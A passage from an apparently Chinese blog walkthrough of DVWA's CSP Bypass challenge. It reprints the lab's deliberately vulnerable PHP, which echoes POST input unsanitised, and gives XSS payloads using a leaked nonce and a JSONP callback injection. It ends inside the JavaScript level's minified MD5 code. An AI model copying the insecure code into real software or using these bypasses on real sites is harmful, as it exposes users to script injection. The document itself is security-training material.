</span><span class=err>$page[ &#39;body&#39; ] .= &#39;  
</span><span class=err>&lt;form name=&#34;csp&#34; method=&#34;POST&#34;&gt;  
</span><span class=err>    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;  
</span><span class=err>    &lt;input size=&#34;50&#34; type=&#34;text&#34; name=&#34;include&#34; value=&#34;&#34; id=&#34;include&#34; /&gt;  
</span><span class=err>    &lt;input type=&#34;submit&#34; value=&#34;Include&#34; /&gt;  
</span><span class=err>&lt;/form&gt;  
</span><span class=err>&#39;;  
</span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/23.png data-srcset="/images/dvwa/23.png, /images/dvwa/23.png 1.5x, /images/dvwa/23.png 2x" data-sizes=auto alt=/images/dvwa/23.png title=/images/dvwa/23.png></p><p>直接上pastebin网站写一个js的代码写进入即可</p><h3 id=medium-9>medium</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=nv>$headerCSP</span> <span class=o>=</span> <span class=s2>&#34;Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#39;;&#34;</span><span class=p>;</span>  
  
<span class=nx>header</span><span class=p>(</span><span class=nv>$headerCSP</span><span class=p>);</span>  
  
<span class=c1>// Disable XSS protections so that inline alert boxes will work  
</span><span class=c1></span><span class=nx>header</span> <span class=p>(</span><span class=s2>&#34;X-XSS-Protection: 0&#34;</span><span class=p>);</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span><span class=err>&lt;?php  
</span><span class=err>if (isset ($_POST[&#39;include&#39;])) {  
</span><span class=err>$page[ &#39;body&#39; ] .= &#34;  
</span><span class=err>    &#34; . $_POST[&#39;include&#39;] . &#34;  
</span><span class=err>&#34;;  
</span><span class=err>}  
</span><span class=err>$page[ &#39;body&#39; ] .= &#39;  
</span><span class=err>&lt;form name=&#34;csp&#34; method=&#34;POST&#34;&gt;  
</span><span class=err>    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;  
</span><span class=err>    &lt;input size=&#34;50&#34; type=&#34;text&#34; name=&#34;include&#34; value=&#34;&#34; id=&#34;include&#34; /&gt;  
</span><span class=err>    &lt;input type=&#34;submit&#34; value=&#34;Include&#34; /&gt;  
</span><span class=err>&lt;/form&gt;  
</span><span class=err>&#39;;  
</span></code></pre></td></tr></table></div></div><p>http头信息中的script-src的合法来源发生了变化，说明如下</p><ul><li><code>unsafe-inline</code>，允许使用内联资源，如内联&lt; script>元素，javascript:URL，内联事件处理程序（如onclick）和内联&lt; style>元素。必须包括单引号。</li><li><code>nonce-source</code>，仅允许特定的内联脚本。nonce=&ldquo;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&rdquo;</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;</span><span class=nx>script</span> <span class=nx>nonce</span><span class=o>=</span><span class=s2>&#34;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#34;</span><span class=o>&gt;</span><span class=nx>alert</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>&lt;/</span><span class=nx>script</span><span class=o>&gt;</span>  
</code></pre></td></tr></table></div></div><h3 id=high-9>high</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
<span class=nv>$headerCSP</span> <span class=o>=</span> <span class=s2>&#34;Content-Security-Policy: script-src &#39;self&#39;;&#34;</span><span class=p>;</span>  
  
<span class=nx>header</span><span class=p>(</span><span class=nv>$headerCSP</span><span class=p>);</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span><span class=err>&lt;?php  
</span><span class=err>if (isset ($_POST[&#39;include&#39;])) {  
</span><span class=err>$page[ &#39;body&#39; ] .= &#34;  
</span><span class=err>    &#34; . $_POST[&#39;include&#39;] . &#34;  
</span><span class=err>&#34;;  
</span><span class=err>}  
</span><span class=err>$page[ &#39;body&#39; ] .= &#39;  
</span><span class=err>&lt;form name=&#34;csp&#34; method=&#34;POST&#34;&gt;  
</span><span class=err>    &lt;p&gt;The page makes a call to &#39; . DVWA_WEB_PAGE_TO_ROOT . &#39;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;  
</span><span class=err>    &lt;p&gt;1+2+3+4+5=&lt;span id=&#34;answer&#34;&gt;&lt;/span&gt;&lt;/p&gt;  
</span><span class=err>    &lt;input type=&#34;button&#34; id=&#34;solve&#34; value=&#34;Solve the sum&#34; /&gt;  
</span><span class=err>&lt;/form&gt;  
</span><span class=err>  
</span><span class=err>&lt;script src=&#34;source/high.js&#34;&gt;&lt;/script&gt;  
</span><span class=err>&#39;;  
</span><span class=err>function clickButton() {  
</span><span class=err>    var s = document.createElement(&#34;script&#34;);  
</span><span class=err>    s.src = &#34;source/jsonp.php?callback=solveSum&#34;;  
</span><span class=err>    document.body.appendChild(s);  
</span><span class=err>}  
</span><span class=err>  
</span><span class=err>function solveSum(obj) {  
</span><span class=err>    if (&#34;answer&#34; in obj) {  
</span><span class=err>        document.getElementById(&#34;answer&#34;).innerHTML = obj[&#39;answer&#39;];  
</span><span class=err>    }  
</span><span class=err>}  
</span><span class=err>  
</span><span class=err>var solve_button = document.getElementById (&#34;solve&#34;);  
</span><span class=err>  
</span><span class=err>if (solve_button) {  
</span><span class=err>    solve_button.addEventListener(&#34;click&#34;, function() {  
</span><span class=err>        clickButton();  
</span><span class=err>    });  
</span><span class=err>}  
</span></code></pre></td></tr></table></div></div><p>CSP头中只有<code>script-src 'self'</code>说明只允许本节面加载的js执行。js逻辑：</p><p>点击按钮 -> js 生成一个 script 标签(src 指向 source/jsonp.php?callback=solveNum), 并把它加入到 DOM 中 -> js 中定义了一个 solveNum 的函数 -> 因此 script 标签会把远程加载的<code>solveSum({"answer":"15"})</code>当作js代码执行。</p><p>但是服务端的代码中，可以接收include传入的参数。</p><p>callback 参数可以被操控以生成任何你想要得到的结果, 比如 alert, 因此可以构造 Payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-jsx data-lang=jsx><span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;source/jsonp.php?callback=alert(&#39;hacked&#39;);&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>  
</code></pre></td></tr></table></div></div><p>把这个当做 include 参数传给界面就注入成功</p><h2 id=javascript>JavaScript</h2><h3 id=low-11>low</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-jsx data-lang=jsx><span class=o>&lt;?</span><span class=nx>php</span>  
<span class=nx>$page</span><span class=p>[</span> <span class=s1>&#39;body&#39;</span> <span class=p>]</span> <span class=p>.</span><span class=o>=</span> <span class=o>&lt;&lt;</span><span class=p>&lt;</span><span class=nt>EOF</span>  
<span class=err>&lt;</span><span class=na>script</span><span class=p>&gt;</span>  
  
<span class=cm>/*  
</span><span class=cm>MD5 code from here  
</span><span class=cm>&lt;https://github.com/blueimp/JavaScript-MD5&gt;  
</span><span class=cm>*/</span>  
  
<span class=o>!</span><span class=kd>function</span><span class=p>(</span><span class=nx>n</span><span class=p>){</span><span class=s2>&#34;use strict&#34;</span><span class=p>;</span><span class=kd>function</span> <span class=nx>t</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>){</span><span class=kd>var</span> <span class=nx>r</span><span class=o>=</span><span class=p>(</span><span class=mi>65535</span><span class=o>&amp;</span><span class=nx>n</span><span class=p>)</span><span class=o>+</span><span class=p>(</span><span class=mi>65535</span><span class=o>&amp;</span><span class=nx>t</span><span class=p>);</span><span class=k>return</span><span class=p>(</span><span class=nx>n</span><span class=o>&gt;&gt;</span><span class=mi>16</span><span class=p>)</span><span class=o>+</span><span class=p>(</span><span class=nx>t</span><span class=o>&gt;&gt;</span><span class=mi>16</span><span class=p>)</span><span class=o>+</span><span class=p>(</span><span class=nx>r</span><span class=o>&gt;&gt;</span><span class=mi>16</span><span class=p>)</span><span class=o>&lt;&lt;</span><span class=mi>16</span><span class=o>|</span><span class=mi>65535</span><span class=o>&amp;</span><span class=nx>r</span><span class=p>}</span><span class=kd>function</span> <span class=nx>r</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>){</span><span class=k>return</span> <span class=nx>n</span><span class=o>&lt;&lt;</span><span class=nx>t</span><span class=o>|</span><span class=nx>n</span><span class=o>&gt;&gt;&gt;</span><span class=mi>32</span><span class=o>-</span><span class=nx>t</span><span class=p>}</span><span class=kd>function</span> <span class=nx>e</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>e</span><span class=p>,</span><span class=nx>o</span><span class=p>,</span><span class=nx>u</span><span class=p>,</span><span class=nx>c</span><span class=p>,</span><span class=nx>f</span><span class=p>){</span><span class=k>return</span> <span class=nx>t</span><span class=p>(</span><span class=nx>r</span><span class=p>(</span><span class=nx>t</span><span class=p>(</span><span class=nx>t</span><span class=p>(</span><span class=nx>e</span><span class=p>,</span><span class=nx>n</span><span class=p>),</span><span class=nx>t</span><span class=p>(</span><span class=nx>u</span><span class=p>,</span><span class=nx>f</span><span class=p>)),</span><span class=nx>c</span><span class=p>),</span><span class=nx>o</span><span class=p>)}</span><span class=kd>function</span> <span class=nx>o</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>,</span><span class=nx>r</span><span class=p>,</span><span class=nx>o</span><span class=p>,</span><span class=nx>u</span><span class=p>,</span><span class=nx>c</span><span class=p>,</span><span class=nx>f</span><span class=p>){</span><span class=k>return</span> <span class=nx>e</span><span class=p>(</span><span class=nx>t</span><span class=o>&amp;</span><span class=nx>r</span><span class=o>|~</span><span class=nx>t</span><span class=o>&amp;</span><span class=nx>o</span><span class=p>,</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>,</span><span class=nx>u</span><span class=p>,</span><span class=nx>c</span><span class=p>,</span><span class=nx>f</span><span class=p>)}</span><span class=kd>function</span> <span class=nx>u</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>,</span><span class=nx>r</span><span class=p>,</span><span class=nx>o</span><span class=p>,</span><span class=nx>u</span><span class=p>,</span><span class=nx>c</span><span class=p>,</span><span class=nx>f</span><span class=p>){</span><span class=k>return</span> <span class=nx>e</span><span class=p>(</span><span class=nx>t</span><span class=o>&amp;</span><span class=nx>o</span><span class=o>|</span><span class=nx>r</span><span class=o>&amp;~</span><span class=nx>o</span><span class=p>,</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>,</span><span class=nx>u</span><span class=p>,</span><span class=nx>c</span><span class=p>,</span><span class=nx>f</span><span class=p>)}</span><span class=kd>function</span> <span class=nx>c</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>,</span><span class=nx>r</span><span class=p>,</span><span class=nx>o</span><span class=p>,</span><span class=nx>u</span><span class=p>,</span><span class=nx>c</span><span class=p>,</span><span class=nx>f</span><span class=p>){</span><span class=k>return</span> <span class=nx>e</span><span class=p>(</span><span class=nx>t</span><span class=o>^</span><span class=nx>r</span><span class=o>^</span><span class=nx>o</span><span class=p>,</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>,</span><span class=nx>u</span><span class=p>,</span><span class=nx>c</span><span class=p>,</span><span class=nx>f</span><span class=p>)}</span><span class=kd>function</span> <span class=nx>f</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>,</span><span class=nx>r</span><span class=p>,</span><span class=nx>o</span><span class=p>,</span><span class=nx>u</span><span class=p>,</span><span class=nx>c</span><span class=p>,</span><span class=nx>f</span><span class=p>){</span><span class=k>return</span> <span class=nx>e</span><span class=p>(</span><span class=nx>r</span><span class=o>^</span><span class=p>(</span><span class=nx>t</span><span class=o>|~</span><span class=nx>o</span><span class=p>),</span><span class=nx>n</span><span class=p>,</span><span class=nx>t</span><span class=p>,</span><span class=nx>u</span><span class=p>,</span><span class=nx>c</span><span class=p>,</span><span class=nx>f</span><span class=p>)}</span><span class=kd>function</span> <span class=nx>i</span><span class=p>(</span><span class=nx>n</span><span class=p>,</span><span class=nx>r</span><span class=p>){</span><span class=nx>n</span><span class=p>[</span><span class=nx>r</span><span class=o>&gt;&gt;</span><span class=mi>5</span><span class=p>]</span><span class=o>|=</span><span class=mi>128</span><span class=o>&lt;&lt;</span><span class=nx>r</span><span class=o>%</span><span class=mi>32</span><span class=p>,</span><span class=nx>n</span><span class=p>[</span><span class=mi>14</span><span class=o>+</span><span class=p>(</span><span class=nx>r</span><span class=o>+</span><span class=mi>64</span><span class=o>&gt;&gt;&gt;</span><span class=mi>9</span><span class=o>&lt;&lt;</span><span class=mi>4</span><span class=p>)]</span><span class=o>=</span><span class=nx>r</span><span class=p>;</span><span class=kd>var</span> <span class=nx>e</span><span class=p>,</span><span class=nx>i</span><span class=p>,</span><span class=nx>a</span><span class=p>,</span><span class=nx>d</span><span class=p>,</span><span class=nx>h</span><span class=p>,</span><span class=nx>l</span><span class=o>=</span><span class=mi>1732584193</span><span class=p>,</span><span class=nx>g</span><span class=o>=-</span><span class=mi>271733879</span><span class=p>,</span><span class=nx>v</span><span class=o>=-</span><span class=mi>1732584194</span><span class=p>,</span><span class=nx>m</span><span class=o>=</span><span class=mi>271733878</span><span class=p>;</span><span class=k>for</span><span class=p>(</span><span class=nx>e</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nx>e</span><span class=p>&lt;</span><span class=nt>n.length</span><span class=err>;</span><span class=na>e</span><span class=err>+=</span><span class=na>16</span><span class=err>)</span><span class=na>i</span><span class=o>=</span><span class=na>l</span><span class=err>,</span><span class=na>a</span><span class=o>=</span><span class=na>g</span><span class=err>,</span><span class=na>d</span><span class=o>=</span><span class=na>v</span><span class=err>,</span><span class=na>h</span><span class=o>=</span><span class=na>m</span><span class=err>,</span><span class=na>g</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>f</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>g</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>],</span><span class=na>7</span><span class=err>,-</span><span class=na>680876936</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>1</span><span class=err>],</span><span class=na>12</span><span class=err>,-</span><span class=na>389564586</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>2</span><span class=err>],</span><span class=na>17</span><span class=err>,</span><span class=na>606105819</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>3</span><span class=err>],</span><span class=na>22</span><span class=err>,-</span><span class=na>1044525330</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>4</span><span class=err>],</span><span class=na>7</span><span class=err>,-</span><span class=na>176418897</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>5</span><span class=err>],</span><span class=na>12</span><span class=err>,</span><span class=na>1200080426</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>6</span><span class=err>],</span><span class=na>17</span><span class=err>,-</span><span class=na>1473231341</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>7</span><span class=err>],</span><span class=na>22</span><span class=err>,-</span><span class=na>45705983</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>8</span><span class=err>],</span><span class=na>7</span><span class=err>,</span><span class=na>1770035416</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>9</span><span class=err>],</span><span class=na>12</span><span class=err>,-</span><span class=na>1958414417</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>10</span><span class=err>],</span><span class=na>17</span><span class=err>,-</span><span class=na>42063</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>11</span><span class=err>],</span><span class=na>22</span><span class=err>,-</span><span class=na>1990404162</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>o</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>12</span><span class=err>],</span><span class=na>7</span><span class=err>,</span><span class=na>1804603682</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>13</span><span class=err>],</span><span class=na>12</span><span class=err>,-</span><span class=na>40341101</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>14</span><span class=err>],</span><span class=na>17</span><span class=err>,-</span><span class=na>1502002290</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>15</span><span class=err>],</span><span class=na>22</span><span class=err>,</span><span class=na>1236535329</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>1</span><span class=err>],</span><span class=na>5</span><span class=err>,-</span><span class=na>165796510</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>6</span><span class=err>],</span><span class=na>9</span><span class=err>,-</span><span class=na>1069501632</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>11</span><span class=err>],</span><span class=na>14</span><span class=err>,</span><span class=na>643717713</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>],</span><span class=na>20</span><span class=err>,-</span><span class=na>373897302</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>5</span><span class=err>],</span><span class=na>5</span><span class=err>,-</span><span class=na>701558691</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>10</span><span class=err>],</span><span class=na>9</span><span class=err>,</span><span class=na>38016083</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>15</span><span class=err>],</span><span class=na>14</span><span class=err>,-</span><span class=na>660478335</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>4</span><span class=err>],</span><span class=na>20</span><span class=err>,-</span><span class=na>405537848</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>9</span><span class=err>],</span><span class=na>5</span><span class=err>,</span><span class=na>568446438</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>14</span><span class=err>],</span><span class=na>9</span><span class=err>,-</span><span class=na>1019803690</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>3</span><span class=err>],</span><span class=na>14</span><span class=err>,-</span><span class=na>187363961</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>8</span><span class=err>],</span><span class=na>20</span><span class=err>,</span><span class=na>1163531501</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>u</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>13</span><span class=err>],</span><span class=na>5</span><span class=err>,-</span><span class=na>1444681467</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>2</span><span class=err>],</span><span class=na>9</span><span class=err>,-</span><span class=na>51403784</span><span class=err>),</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>7</span><span class=err>],</span><span class=na>14</span><span class=err>,</span><span class=na>1735328473</span><span class=err>),</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>12</span><span class=err>],</span><span class=na>20</span><span class=err>,-</span><span class=na>1926607734</span><span class=err>),</span><span class=na>v</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>m</span><span class=err>,</span><span class=na>l</span><span class=o>=</span><span class=na>c</span><span class=err>(</span><span class=na>l</span><span class=err>,</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>m</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span class=na>5</span><span class=err>],</span><span class=na>4</span><span class=err>,-</span><span class=na>378558</span><span class=err>),</span><span class=na>g</span><span class=err>,</span><span class=na>v</span><span class=err>,</span><span class=na>n</span><span class=err>[</span><span class=na>e</span><span class=err>+</span><span 